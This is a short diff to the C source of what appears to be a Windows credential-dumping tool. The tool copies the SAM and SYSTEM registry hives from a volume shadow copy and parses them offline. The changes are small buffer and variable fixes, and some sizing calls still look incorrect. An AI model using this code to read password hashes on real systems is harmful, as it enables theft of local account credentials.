@@ -157,11 +157,11 @@ BOOL createSS() {
 	// Perform the copy from SS
 
 	// SAM
-	WCHAR sourcePathFileSAM[MAX_PATH];
+	WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)];
 	strResult = swprintf(sourcePathFileSAM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, L"Windows\\System32\\Config\\SAM");
 
 	// SYSTEN
-	WCHAR sourcePathFileSYSTEM[MAX_PATH];
+	WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)];
 	strResult = swprintf(sourcePathFileSYSTEM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, L"Windows\\System32\\Config\\SYSTEM");
 
 	// getSAMfromRegf()
@@ -265,7 +265,7 @@ void getSAMfromRegf(PSAM samRegEntries[], PULONG size, WCHAR SAMPath[MAX_PATH], 
 				exit(ret);
 			}
 
-			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAMPath));
+			PSAM sam = (PSAM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAMPath));
 			wcscpy_s(sam->rid, wcslen(nameSubkeyKey), nameSubkeyKey);
 
 			// TODO
@@ -382,6 +382,7 @@ void getClassesfromRegf(PSAM samRegEntry, WCHAR SYSTEMPath[MAX_PATH]) {
 			exit(ret);
 		}
 
+		lenRead = 0;
 		ret = ORQueryInfoKey(subKey, keyClass, &lenRead, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
 		if (!NT_SUCCESS(ret)) {
